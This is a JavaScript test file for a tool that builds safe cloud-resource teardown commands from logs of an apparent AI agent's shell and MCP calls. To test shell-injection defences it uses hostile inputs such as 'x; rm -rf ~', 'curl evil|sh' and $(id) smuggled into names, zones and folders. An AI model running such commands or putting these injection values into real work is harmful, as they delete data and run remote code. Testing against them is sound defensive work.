'use strict';
// v0.4.2: teardown-command safety, from the v0.4.1 teardown review (review-c).
// Every high item has a test here; so do the mediums that were fixed and the four
// coverage additions (docker-compose -f, sst deploy, node pools, CloudFormation).
const assert = require('assert');
const { spawnSync } = require('child_process');
const { scan } = require('../src/scan');
const { checkFor, verify } = require('../src/verify');

let n = 0;
const ev = (command, o = {}) => ({ kind: 'cmd', command, time: `2026-11-01T00:${String(n++ % 60).padStart(2, '0')}:00Z`, cwd: '/home/u/proj', session: 's1', tool: 'claude', ...o });
const mcp = (tool_name, input, result) => ({ kind: 'mcp', tool_name, input, result, time: `2026-11-01T01:${String(n++ % 60).padStart(2, '0')}:00Z`, cwd: '/home/u/proj', session: 's1', tool: 'claude' });
const { oneLine } = require('../src/teardown');
const full = (r) => oneLine(r); // v0.4.2r2: command + hint (+ cd), the old one-line form
// Most checks below read the old one-line form; teardown-split tests (windows-test.js) check the fields.
const scanF = (evs, o) => scan(evs, o).resources.map((f) => ({ ...f, teardown: full(f) }));
const run = (...cmds) => scan(cmds.map((c) => (typeof c === 'string' ? ev(c) : c))).resources.map((f) => ({ ...f, teardown: full(f) }));
const one = (rule, ...cmds) => { const f = run(...cmds).find((x) => x.rule === rule); assert.ok(f, `no ${rule} finding`); return f; };
const hasBash = process.platform !== 'win32' && spawnSync('bash', ['-c', 'true']).status === 0;
// How bash splits a piece of a teardown into words (without running anything but printf).
const words = (s) => spawnSync('bash', ['-c', `set -- ${s}; printf '%s\\n' "$#"; for a in "$@"; do printf '%s\\0' "$a"; done`], { encoding: 'utf8' }).stdout;
const bashOk = (s) => spawnSync('bash', ['-n', '-c', s]).status === 0;

module.exports = (t) => {
  // 1. Shell injection through names, flag values and folders
  t('teardown: a name with shell characters becomes <NAME>, with a note', () => {
    const r = run("gcloud compute instances create 'x; rm -rf ~' --zone us-central1-a", "aws lambda create-function --function-name 'f && curl evil|sh' --runtime nodejs20.x");
    for (const f of r) {
      assert.ok(/<NAME>/.test(f.teardown) && !/rm -rf|curl/.test(f.teardown), f.teardown);
      assert.ok(/shell would run as code/.test(f.note || ''), f.note);
    }
  });
  t('teardown: a flag value with shell characters is single-quoted', () => {
    const f = one('gcp-vm', "gcloud compute instances create vm1 --zone 'z; touch /tmp/pwned'");
    assert.ok(f.teardown.includes("--zone 'z; touch /tmp/pwned'"), f.teardown);
    if (hasBash) assert.strictEqual(words(f.teardown.replace(/^.*--zone /, '')), "1\nz; touch /tmp/pwned\0");
  });
  t('teardown: a folder with quotes, $( and backticks is single-quoted (terraform -chdir)', () => {
    const cwd = '/tmp/x"; touch /tmp/pwned; echo "\'q';
    const f = scan([ev('terraform apply -auto-approve', { cwd })]).resources[0];
    assert.ok(f.teardown.startsWith("terraform '-chdir=") && f.teardown.endsWith(' state list') && !f.runIn, f.teardown);
    if (hasBash) { const arg = f.teardown.slice('terraform '.length, -' state list'.length); assert.strictEqual(words(arg), `1\n-chdir=${cwd}\0`); }
    // $( and backticks make the folder unknown (a variable): the teardown says <NAME>, never runs it.
    const g = scan([ev('terraform apply -auto-approve', { cwd: '/tmp/$(id)`id`' })]).resources[0];
    assert.ok(g.teardown === 'terraform -chdir=<NAME> state list' && !/\$\(|`/.test(full(g)), g.teardown);
  });
  t('teardown: every folder-bound teardown quotes its folder (runIn, --project-directory, --cwd)', () => {
    const cwd = '/tmp/a b;c';
    const r = scan(['docker compose up -d', 'serverless deploy', 'railway up', 'wrangler deploy', 'fly deploy', 'sam deploy', 'cdk deploy', 'pulumi up', 'sst deploy'].map((c) => ev(c, { cwd }))).resources;
    assert.strictEqual(r.length, 9, r.map((f) => f.rule).join(','));
    for (const f of r) {
      if (f.rule === 'docker-compose') assert.ok(f.teardown.startsWith("docker compose --project-directory '/tmp/a b;c' ps") && !f.runIn, f.teardown);
      else if (f.rule === 'iac-pulumi') assert.strictEqual(f.teardown, "pulumi stack --cwd '/tmp/a b;c'");
      else if (f.rule === 'iac-sst') assert.strictEqual(f.teardown, "cd '/tmp/a b;c'");
      else { assert.strictEqual(f.runIn, cwd, f.rule); assert.ok(full(f).startsWith("cd '/tmp/a b;c' && ") && !/^cd /.test(f.teardown), full(f)); }
    }
  });
  t('teardown: MCP names and ids with shell characters become <NAME>', () => {
    const r = scanF([mcp('mcp__supabase__create_project', { name: 'x; rm -rf ~' }, '{"id":"$(id)"}')]);
    assert.ok(/<NAME>/.test(r[0].teardown) && !/rm -rf|\$\(id\)/.test(r[0].teardown), r[0].teardown);
  });

  // 2. MCP deployment teardowns never remove a whole project or site
  t('teardown: Vercel MCP deploy without an id never offers "vercel remove <project>"', () => {
    const f = scanF([mcp('mcp__vercel__deploy_to_vercel', { name: 'marketing-site' }, '{"status":"ok"}')])[0];
    assert.ok(!/vercel remove marketing-site/.test(f.teardown) && /vercel ls marketing-site\s+# then: vercel remove <DEPLOYMENT_URL> --safe/.test(f.teardown), f.teardown);
    assert.strictEqual(f.deploy, true);
  });
  t('teardown: Vercel MCP deploy with a deployment id removes that deployment with --safe', () => {
    const f = scanF([mcp('mcp__vercel__deploy_to_vercel', { name: 'marketing-site' }, '{"id":"dpl_abc123","url":"x.vercel.app"}')])[0];
    assert.ok(f.teardown.startsWith('vercel remove dpl_abc123 --safe'), f.teardown);
  });
  t('teardown: Netlify MCP deploy never offers sites:delete', () => {
    const f = scanF([mcp('mcp__netlify__deploy_site', { name: 'docs-site' }, '{"status":"ok"}')])[0];
    assert.ok(!/sites:delete/.test(f.teardown) && /netlify status/.test(f.teardown), f.teardown);
    assert.strictEqual(f.deploy, true);
  });

  // 3. serverless keeps --stage / --region / --aws-profile
  t('teardown: serverless info and remove keep --stage, --region and --aws-profile', () => {
    const f = one('iac-serverless', 'serverless deploy --stage prod --region eu-west-1 --aws-profile client');
    assert.ok(/serverless info --stage prod --region eu-west-1 --aws-profile client\s+#.*serverless remove --stage prod --region eu-west-1 --aws-profile client$/.test(f.teardown), f.teardown);
  });
  t('teardown: serverless remove of another stage does not clean the deploy', () => {
    assert.strictEqual(one('iac-serverless', 'serverless deploy --stage prod', 'serverless remove --stage dev').status, 'left');
    assert.strictEqual(one('iac-serverless', 'sls deploy --stage prod', 'serverless remove --stage prod').status, 'cleaned');
  });

  // 4. sam / cdk / eksctl carry profile and region
  t('teardown: sam, cdk and eksctl teardowns carry the profile and region', () => {
    const r = run('export AWS_PROFILE=client-b', 'export AWS_REGION=eu-west-1', 'sam deploy --stack-name api', 'cdk deploy ApiStack', 'eksctl create cluster --name gpu-c');
    const by = (id) => r.find((f) => f.rule === id).teardown;
    assert.ok(/sam delete --stack-name api --profile client-b --region eu-west-1/.test(by('iac-sam')), by('iac-sam'));
    assert.ok(/AWS_REGION=eu-west-1 cdk destroy ApiStack --profile client-b/.test(by('iac-cdk')), by('iac-cdk'));
    assert.ok(/eksctl delete cluster --name gpu-c --profile client-b --region eu-west-1/.test(by('aws-eksctl')), by('aws-eksctl'));
  });

  // 5. kubectl after get-credentials
  t('teardown: kubectl after GKE get-credentials names the gke_ context', () => {
    const f = one('k8s-lb-service', 'gcloud container clusters get-credentials prod-c --zone us-central1-a --project shop', 'kubectl expose deployment web --type=LoadBalancer --port 80');
    assert.ok(f.teardown.startsWith('kubectl delete service web --context gke_shop_us-central1-a_prod-c'), f.teardown);
    const c = checkFor(f);
    assert.deepStrictEqual(c.args.slice(-2), ['--context', 'gke_shop_us-central1-a_prod-c']);
  });
  t('teardown: GKE context uses the session project and --location', () => {
    const f = one('k8s-lb-service', 'gcloud config set project shop', 'gcloud container clusters get-credentials c2 --location us-central1', 'kubectl expose deployment web --type=LoadBalancer');
    assert.strictEqual(f.ctx, 'gke_shop_us-central1_c2');
  });
  t('teardown: kubectl after AKS get-credentials uses the cluster name (or -admin)', () => {
    assert.strictEqual(one('k8s-lb-service', 'az aks get-credentials -g rg -n aks1', 'kubectl expose deployment web --type=LoadBalancer').ctx, 'aks1');
    assert.strictEqual(one('k8s-lb-service', 'az aks get-credentials -g rg -n aks1 --admin', 'kubectl expose deployment web --type=LoadBalancer').ctx, 'aks1-admin');
    assert.strictEqual(one('k8s-lb-service', 'aws eks update-kubeconfig --name e1 --alias e1-ctx', 'kubectl expose deployment web --type=LoadBalancer').ctx, 'e1-ctx');
  });
  t('teardown: unknown context (EKS) says which cluster to check first, and --verify does not ask', () => {
    const f = one('k8s-lb-service', 'aws eks update-kubeconfig --name e1 --region us-east-1', 'kubectl expose deployment web --type=LoadBalancer');
    assert.ok(f.teardown.startsWith('kubectl config current-context   # make sure it is e1 first, then: kubectl delete service web'), f.teardown);
    assert.strictEqual(checkFor(f), null);
    const res = [f]; verify(res, { env: { PATH: '' } });
    assert.ok(f.live === 'unknown' && /context not in the log/.test(f.liveNote), f.liveNote);
  });

  // 6. reads are never deletes
  t('teardown: gcloud storage buckets describe/update/add-iam-policy-binding do not clean a bucket', () => {
    for (const v of ['describe', 'update --versioning', 'add-iam-policy-binding --member=allUsers --role=x', 'list']) {
      assert.strictEqual(one('gcp-bucket', 'gcloud storage buckets create gs://my-data-bkt --location us', `gcloud storage buckets ${v} gs://my-data-bkt`).status, 'left', v);
    }
    assert.strictEqual(one('gcp-bucket', 'gcloud storage buckets create gs://b9', 'gcloud storage buckets delete gs://b9').status, 'cleaned');
    assert.strictEqual(one('gcp-bucket', 'gcloud storage buckets create gs://b9', 'gcloud storage rm -r gs://b9').status, 'cleaned');
  });
  t('teardown: fly apps list/create/restart do not touch a fly app', () => {
    for (const v of ['fly apps list', 'fly apps create other', 'fly apps restart demo-app']) assert.strictEqual(one('fly-app', 'fly launch --name demo-app', v).status, 'left', v);
    assert.strictEqual(one('fly-app', 'fly launch --name demo-app', 'fly apps destroy demo-app --yes').status, 'cleaned');
  });

  // 7. docker compose
  t('teardown: docker compose keeps -p and -f in ps and down', () => {
    const f = one('docker-compose', 'docker compose -p demo -f docker-compose.prod.yml up -d');
    assert.strictEqual(f.teardown, 'docker compose --project-directory /home/u/proj -p demo -f /home/u/proj/docker-compose.prod.yml ps   # then: docker compose --project-directory /home/u/proj -p demo -f /home/u/proj/docker-compose.prod.yml down');
  });
  t('teardown: docker-compose -f x.yml up -d is detected', () => {
    const f = one('docker-compose', 'docker-compose -f infra/compose.yml -f infra/override.yml up -d --build');
    assert.strictEqual(f.name, '/home/u/proj/infra');
    assert.ok(f.teardown.includes('docker-compose --project-directory /home/u/proj/infra -f /home/u/proj/infra/compose.yml -f /home/u/proj/infra/override.yml down'), f.teardown);
  });
  t('teardown: compose down of another -p project does not clean the stack', () => {
    assert.strictEqual(one('docker-compose', 'docker compose -p demo up -d', 'docker compose -p other down').status, 'left');
    assert.strictEqual(one('docker-compose', 'docker compose -p demo up -d', 'docker compose -p demo down').status, 'cleaned');
    assert.strictEqual(one('docker-compose', 'docker-compose -f infra/compose.yml up -d', 'docker-compose -f infra/compose.yml down').status, 'cleaned');
    assert.ok(!run('docker compose -f x.yml up').length, 'attached up is not a leftover');
  });

  // 8. terraform workspace
  t('teardown: terraform with TF_WORKSPACE is valid shell and keeps the workspace', () => {
    const f = one('iac-terraform', 'TF_WORKSPACE=staging terraform apply -auto-approve');
    assert.ok(f.teardown.startsWith('TF_WORKSPACE=staging terraform -chdir=/home/u/proj state list') && /TF_WORKSPACE=staging terraform -chdir=\/home\/u\/proj destroy -target=<ADDRESS>/.test(f.teardown), f.teardown);
    if (hasBash) assert.ok(bashOk(f.teardown), f.teardown);
  });
  t('teardown: a destroy in another workspace does not clean the apply', () => {
    assert.strictEqual(one('iac-terraform', 'TF_WORKSPACE=staging terraform apply -auto-approve', 'TF_WORKSPACE=prod terraform destroy -auto-approve').status, 'left');
  });

  // Mediums
  t('teardown: GKE --location is kept (delete and --verify)', () => {
    const f = one('gcp-gke', 'gcloud container clusters create c1 --location us-central1-a');
    assert.strictEqual(f.teardown, 'gcloud container clusters delete c1 --location us-central1-a');
    assert.ok(checkFor(f).args.join(' ').includes('--zone us-central1-a'), checkFor(f).args.join(' '));
    assert.ok(checkFor(one('gcp-gke', 'gcloud container clusters create c2 --location us-central1')).args.join(' ').includes('--region us-central1'));
  });
  t('teardown: fly machine destroy has --force and the app', () => {
    assert.ok(/fly machine destroy <ID> --force -a myapp/.test(one('fly-machine', 'fly machine run nginx -a myapp').teardown));
    const f = scanF([mcp('mcp__fly__create_machine', { app: 'myapp', name: 'm1' }, '{"id":"148e1234"}')])[0];
    assert.ok(f.teardown.startsWith('fly machine destroy 148e1234 --force -a myapp'), f.teardown);
  });
  t('teardown: supabase functions delete keeps --project-ref', () => {
    assert.ok(/supabase functions delete hello --project-ref abcdefgh$/.test(one('supabase-fn', 'supabase functions deploy hello --project-ref abcdefgh').teardown));
  });
  t('teardown: --verify reads quoted flag values (--zone="us-central1-a")', () => {
    const f = one('gcp-vm', 'gcloud compute instances create vm9 --zone="us-central1-a"');
    assert.ok(checkFor(f).args.join(' ').includes('--zone us-central1-a'), checkFor(f).args.join(' '));
  });
  t('teardown: placeholders are valid shell (heroku create, az webapp up)', () => {
    const h = one('heroku-create', 'heroku create');
    const w = one('az-webapp', 'az webapp up');
    for (const f of [h, w]) { assert.ok(!/\(new app\)|\(web app\)/.test(f.teardown), f.teardown); if (hasBash) assert.ok(bashOk(f.teardown), f.teardown); }
    assert.ok(/az webapp delete -g rg1 -n w1/.test(one('az-webapp', 'az webapp create -g rg1 -n w1 -p plan').teardown));
  });
  t('teardown: smaller fixes (R2 jurisdiction, pulumi -C, railway, heroku add-on, Aurora member)', () => {
    assert.ok(/wrangler r2 bucket delete eu-assets --jurisdiction eu/.test(one('cf-r2', 'wrangler r2 bucket create eu-assets --jurisdiction eu').teardown));
    assert.strictEqual(one('iac-pulumi', 'pulumi up -C infra').name, '/home/u/proj/infra');
    assert.ok(!/: railway down/.test(one('railway-up', 'railway up').teardown));
    assert.ok(/addons:destroy <ADDON_NAME> --app myapp/.test(one('heroku-addon', 'heroku addons:create heroku-postgresql:essential-0 -a myapp').teardown));
    assert.ok(!/final-db-snapshot-identifier aur-1-final/.test(one('aws-rds', 'aws rds create-db-instance --db-instance-identifier aur-1 --db-cluster-identifier aur --engine aurora-postgresql').teardown));
  });

  // Coverage added in 0.4.2
  t('coverage: GKE node pool, cleaned by its delete or by deleting the cluster', () => {
    const f = one('gcp-gke-pool', 'gcloud container node-pools create gpu --cluster c1 --zone us-central1-a --accelerator type=nvidia-l4,count=1');
    assert.strictEqual(f.teardown, 'gcloud container node-pools delete gpu --cluster c1 --zone us-central1-a');
    assert.strictEqual(one('gcp-gke-pool', 'gcloud container node-pools create gpu --cluster c1 --zone z', 'gcloud container node-pools delete gpu --cluster c1 --zone z').status, 'cleaned');
    assert.strictEqual(one('gcp-gke-pool', 'gcloud container node-pools create gpu --cluster c1 --zone z', 'gcloud container node-pools delete gpu --cluster c2 --zone z').status, 'left');
    assert.strictEqual(one('gcp-gke-pool', 'gcloud container node-pools create gpu --cluster c1 --zone z', 'gcloud container clusters delete c1 --zone z').status, 'cleaned');
  });
  t('coverage: eksctl node group and AKS node pool', () => {
    const e = one('aws-eksctl-ng', 'eksctl create nodegroup --cluster c1 --name gpu --node-type g5.xlarge --region us-east-1');
    assert.ok(e.teardown.startsWith('eksctl delete nodegroup --cluster c1 --name gpu --region us-east-1'), e.teardown);
    assert.strictEqual(one('aws-eksctl-ng', 'eksctl create nodegroup --cluster c1 --name gpu', 'eksctl delete cluster --name c1').status, 'cleaned');
    const a = one('az-aks-nodepool', 'az aks nodepool add -g rg --cluster-name aks1 -n gpu --node-vm-size Standard_NC6s_v3');
    assert.strictEqual(a.teardown, 'az aks nodepool delete -g rg --cluster-name aks1 -n gpu');
    assert.strictEqual(one('az-aks-nodepool', 'az aks nodepool add -g rg --cluster-name aks1 -n gpu', 'az aks nodepool delete -g rg --cluster-name aks1 -n gpu').status, 'cleaned');
    assert.strictEqual(one('az-aks-nodepool', 'az aks nodepool add -g rg --cluster-name aks1 -n gpu', 'az aks nodepool list -g rg --cluster-name aks1').status, 'left');
    assert.strictEqual(one('az-aks-nodepool', 'az aks nodepool add -g rg --cluster-name aks1 -n gpu', 'az aks delete -g rg -n aks1 --yes').status, 'cleaned');
  });
  t('coverage: aws cloudformation deploy / create-stack, cleaned by delete-stack', () => {
    const f = one('aws-cfn', 'aws cloudformation deploy --stack-name web --template-file t.yml --region us-east-1');
    assert.ok(f.deploy && /describe-stacks --stack-name web --region us-east-1/.test(f.teardown), f.teardown);
    assert.strictEqual(one('aws-cfn', 'aws cloudformation create-stack --stack-name s2 --template-body file://t.yml', 'aws cloudformation delete-stack --stack-name s2').status, 'cleaned');
    assert.strictEqual(one('aws-cfn', 'aws cloudformation create-stack --stack-name s2', 'aws cloudformation describe-stacks --stack-name s2').status, 'left');
  });
  t('coverage: sst deploy, cleaned by sst remove of the same stage', () => {
    const f = one('iac-sst', 'sst deploy --stage pr-12');
    assert.ok(f.deploy && /sst remove --stage pr-12/.test(f.teardown), f.teardown);
    assert.strictEqual(one('iac-sst', 'sst deploy --stage pr-12', 'sst remove --stage production').status, 'left');
    assert.strictEqual(one('iac-sst', 'sst deploy --stage pr-12', 'sst remove --stage pr-12').status, 'cleaned');
  });
};
